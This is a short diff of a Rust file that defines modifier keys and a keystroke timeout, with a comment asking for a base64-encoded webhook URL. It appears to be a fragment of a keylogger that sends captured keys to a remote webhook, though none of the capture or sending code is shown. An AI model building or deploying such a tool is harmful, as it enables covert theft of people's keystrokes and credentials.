@@ -14,7 +14,7 @@ use std::{
 pub const MODIFIER_KEYS: [Key; 4] = [Key::Alt, Key::AltGr, Key::MetaLeft, Key::MetaRight];
 
 // changes the timeout after pressing a modifier key to ignore a typed key.
-// set this to something low!
+// set this to something low.
 pub const TIMEOUT: Duration = Duration::from_millis(10);
 
 // change this to your webhook URL, encoded in base64
